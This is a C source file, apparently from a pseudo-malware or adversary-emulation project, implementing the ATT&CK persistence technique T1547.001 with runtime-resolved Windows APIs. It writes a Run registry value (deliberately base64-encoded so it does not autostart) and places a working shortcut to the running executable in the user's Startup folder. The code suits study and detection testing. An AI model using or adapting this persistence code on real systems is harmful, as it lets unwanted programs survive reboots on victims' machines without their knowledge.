#include "T1547.001.h"

#include "../misc/common.h"
#include "../misc/function_pointers.h"
#include "../misc/str.h"
#include "../misc/wstr.h"
#include "../runtime_linking.h"

#include <assert.h>
#include <stdio.h>

#define WIN_LEAN_AND_MEAN
#include <Windows.h>
#include <wincrypt.h>
#include <ShlObj.h>
#include <ShObjIdl.h>
#include <ShlGuid.h>
#include <objbase.h>


// Kernel32.dll
#define MULTI_BYTE_TO_WIDE_CHAR 0
static const char* kernel32Procedures[1] = { "MultiByteToWideChar" };
// advapi32.dll
#define REG_CREATE_KEY_EX_W 0
#define REG_SET_VALUE_EX_A 1
#define REG_CLOSE_KEY 2
static const char* advapi32Procedures[3] = { "RegCreateKeyExW", "RegSetValueExA", "RegCloseKey" };
// Crypt32.dll
#define CRYPT_BINARY_TO_STRING_A 0
static const char* crypt32Procedures[1] = { "CryptBinaryToStringA" };
// Shell32.dll
#define SH_GET_KNOWN_FOLDER_PATH 0
static const char* shell32Procedures[1] = { "SHGetKnownFolderPath" };
// Ole32.dll
#define CO_TASK_MEM_FREE 0
#define CO_INITIALIZE_EX 1
#define CO_CREATE_INSTANCE 2
#define CO_UNINITIALIZE 3
static const char* ole32Procedures[4] = { "CoTaskMemFree", "CoInitializeEx", "CoCreateInstance", "CoUninitialize" };


static HKEY create_key(ProcedureList* pAdvapi32, HKEY key, LPCWSTR subkey)
{
	HKEY hKey = NULL;
	DWORD disposition = 0;

	PFN_RegCreateKeyExW reg_create_key_ex_w = *VECTOR_AT(pAdvapi32->procedures, PFN_RegCreateKeyExW, REG_CREATE_KEY_EX_W);
	LSTATUS status = reg_create_key_ex_w(key,
									 subkey,
									 0,
									 NULL,
									 REG_OPTION_NON_VOLATILE,
									 KEY_CREATE_SUB_KEY | KEY_SET_VALUE,
									 NULL,
									 &hKey,
									 &disposition);
	if (status != ERROR_ACCESS_DENIED && status != ERROR_SUCCESS)
	{
		assert(FALSE);
	}


	return hKey;
}
static HKEY get_key_handle(ProcedureList* pAdvapi32)
{
	LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey = create_key(pAdvapi32, HKEY_LOCAL_MACHINE, subkey);
	if (hKey == NULL)
	{
		hKey = create_key(pAdvapi32, HKEY_CURRENT_USER, subkey);
	}

	return hKey;
}
static String to_base64(ProcedureList* pCrypt32, const char* string)
{
	size_t len = strlen(string);
	DWORD size = 0;
	PFN_CryptBinaryToStringA crypt_binary_to_string_a = *VECTOR_AT(pCrypt32->procedures, 
																   PFN_CryptBinaryToStringA, 
																   CRYPT_BINARY_TO_STRING_A);
	if (!crypt_binary_to_string_a(string, (DWORD) len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
	{
		return (String) { 0 };
	}

	Vector buffer = VECTOR_CREATE(char, size);
	BOOL b = crypt_binary_to_string_a(string, (DWORD) len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, buffer.pData, &size);
	if (*VECTOR_BACK(buffer, char) != '\0')
	{
		char terminator = '\0';
		VECTOR_PUSH_BACK(buffer, char, terminator);
	}

	String encoded = { 0 };
	encoded.array = buffer;
	encoded.length = size;
	
	return encoded;
}
static void set_auto_run_value(ProcedureList* pAdvapi32, ProcedureList* pCrypt32, char** argv, HKEY hKey)
{
	// Alternative to installing the actual filepath and having the program run automatically (which would be annoying).
	const char* filepath = argv[0];
	String encodedFilepath = to_base64(pCrypt32, filepath);
	if (encodedFilepath.array.pData == NULL)
	{
		return;
	}


	PFN_RegSetValueExA reg_set_value_ex_a = *VECTOR_AT(pAdvapi32->procedures, PFN_RegSetValueExA, REG_SET_VALUE_EX_A);
	if (reg_set_value_ex_a(hKey,
						   "__Pseudo_Malware", 
						   0, 
						   REG_SZ,
						   encodedFilepath.array.pData,
						   STRING_SIZE(encodedFilepath) + 1) != ERROR_SUCCESS)
	{
		assert(FALSE);
	}

	PFN_RegCloseKey reg_close_key = *VECTOR_AT(pAdvapi32->procedures, PFN_RegCloseKey, REG_CLOSE_KEY);
	if (reg_close_key(hKey) != ERROR_SUCCESS)
	{
		assert(FALSE);
	}

	STRING_DESTROY(encodedFilepath);
}
static void add_run_key(ProcedureList* pAdvapi32, ProcedureList* pCrypt32, char** argv)
{
	HKEY hKey = get_key_handle(pAdvapi32);
	if (hKey == NULL)
	{
		return;
	}

	set_auto_run_value(pAdvapi32, pCrypt32, argv, hKey);
}
static WideString to_wide_string(ProcedureList* pKernel32, const char* str)
{
	assert(str != NULL);

	WCHAR tmp[2048] = { 0 };
	PFN_MultiByteToWideChar multi_byte_to_wide_char = *VECTOR_AT(pKernel32->procedures, 
																 PFN_MultiByteToWideChar, 
																 MULTI_BYTE_TO_WIDE_CHAR);
	int32_t written = multi_byte_to_wide_char(CP_UTF8, MB_ERR_INVALID_CHARS, str, -1, tmp, ARRAYSIZE(tmp));
	if (written == 0)
	{
		PRINT_WIN32_ERROR(MultiByteToWideChar);
		assert(FALSE);
		return (WideString) { 0 };
	}

	return WSTRING_CREATE_FROM_LPCWSTR(tmp);
}
static LPCWSTR find_filename(LPCWSTR str)
{
	LPCWSTR last = str;
	for (LPCWSTR p = str; *p; ++p)
	{
		if (*p == L'\\' || *p == L'/')
		{
			last = p + 1;
		}
	}

	return last;
}
static WideString append_filename(LPCWSTR target, LPCWSTR lnkPath)
{
	assert(target != NULL);
	assert(lnkPath != NULL);

	LPCWSTR pFilename = find_filename(target);

	WideString fullpath = WSTRING_CREATE_FROM_LPCWSTR(lnkPath);
	WCHAR backslash = L'\\';
	WSTRING_PUSH_BACK(fullpath, backslash);

	do
	{
		WCHAR c = *pFilename;
		WSTRING_PUSH_BACK(fullpath, c);
		++pFilename;
	} while (*pFilename != L'\0');

	WCHAR terminator = L'\0';
	WSTRING_PUSH_BACK(fullpath, terminator);

	return fullpath;
}
static BOOL init_com(ProcedureList* pOle32)
{
	PFN_CoInitializeEx co_initialize_ex = *VECTOR_AT(pOle32->procedures, PFN_CoInitializeEx, CO_INITIALIZE_EX);
	HRESULT res = co_initialize_ex(NULL, COINIT_APARTMENTTHREADED);
	if (!SUCCEEDED(res))
	{
		printf("CoInitializeEx failed with code: 0x%08lX\n", res);
		return FALSE;
	}

	return TRUE;
}
static void store_lnk_file(ProcedureList* pOle32, LPCWSTR target, LPCWSTR lnkPath)
{
	BOOL inited = init_com(pOle32);
	if (!inited)
	{
		return;
	}

	IShellLinkW* pLink = NULL;
	PFN_CoCreateInstance co_create_instance = *VECTOR_AT(pOle32->procedures, PFN_CoCreateInstance, CO_CREATE_INSTANCE);
	HRESULT res = co_create_instance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**) (&pLink));
	if (SUCCEEDED(res))
	{
		assert(pLink != NULL);

		res = pLink->lpVtbl->SetPath(pLink, target);
		if (SUCCEEDED(res))
		{
			IPersistFile* pPersist = NULL;
			res = pLink->lpVtbl->QueryInterface(pLink, &IID_IPersistFile, (void**) &pPersist);
			if (SUCCEEDED(res))
			{
				res = pPersist->lpVtbl->Save(pPersist, lnkPath, TRUE);
				if (!SUCCEEDED(res))
				{
					printf("pPersist->Save failed with code: 0x%08lX\n", res);
				}

				pPersist->lpVtbl->Release(pPersist);
			}
			else
			{
				printf("pLink->QueryInterface failed with code: 0x%08lX\n", res);
			}
		}
		else
		{
			printf("pLink->SetPath failed with code: 0x%08lX\n", res);
		}

		pLink->lpVtbl->Release(pLink);
	}
	else
	{
		printf("CoCreateInstance failed with code: 0x%08lX\n", res);
	}


	PFN_CoUninitialize co_uninitialize = *VECTOR_AT(pOle32->procedures, PFN_CoUninitialize, CO_UNINITIALIZE);
	co_uninitialize();
}
static void add_lnk_to_startup_dir(ProcedureList* pKernel32, ProcedureList* pShell32, ProcedureList* pOle32, char** argv)
{
	PWSTR startupFolder = NULL;
	PFN_SHGetKnownFolderPath sh_get_known_folder_path = *VECTOR_AT(pShell32->procedures, PFN_SHGetKnownFolderPath, SH_GET_KNOWN_FOLDER_PATH);
	HRESULT res = sh_get_known_folder_path(&FOLDERID_Startup, 0, NULL, &startupFolder);
	if (res != S_OK)
	{
		printf("SHGetKnownFolderPath failed with code: 0x%08lX\n", res);
		assert(FALSE);
		return;
	}

	WideString target = to_wide_string(pKernel32, argv[0]);
	WideString lnkLocation = append_filename(WSTRING_C_STR(target), startupFolder);
	if (target.array.pData != NULL && lnkLocation.array.pData != NULL)
	{
		store_lnk_file(pOle32, WSTRING_C_STR(target), WSTRING_C_STR(lnkLocation));
	}
	if (target.array.pData != NULL)
	{
		WSTRING_DESTROY(target);
	}
	if (lnkLocation.array.pData != NULL)
	{
		WSTRING_DESTROY(lnkLocation);
	}

	PFN_CoTaskMemFree co_task_mem_free = *VECTOR_AT(pOle32->procedures, PFN_CoTaskMemFree, CO_TASK_MEM_FREE);
	co_task_mem_free(startupFolder);
}
//
//
void execute_t1574_001(char** argv)
{
	ProcedureList kernel32 = procedure_list_create("Kernel32.dll", kernel32Procedures, ARRAYSIZE(kernel32Procedures));
	ProcedureList advapi32 = procedure_list_create("advapi32.dll", advapi32Procedures, ARRAYSIZE(advapi32Procedures));
	ProcedureList crypt32 = procedure_list_create("Crypt32.dll", crypt32Procedures, ARRAYSIZE(crypt32Procedures));
	ProcedureList shell32 = procedure_list_create("Shell32.dll", shell32Procedures, ARRAYSIZE(shell32Procedures));
	ProcedureList ole32 = procedure_list_create("Ole32.dll", ole32Procedures, ARRAYSIZE(ole32Procedures));


	add_run_key(&advapi32, &crypt32, argv);
	add_lnk_to_startup_dir(&kernel32, &shell32, &ole32, argv);


	procedure_list_destroy(&ole32);
	procedure_list_destroy(&shell32);
	procedure_list_destroy(&crypt32);
	procedure_list_destroy(&advapi32);
	procedure_list_destroy(&kernel32);
}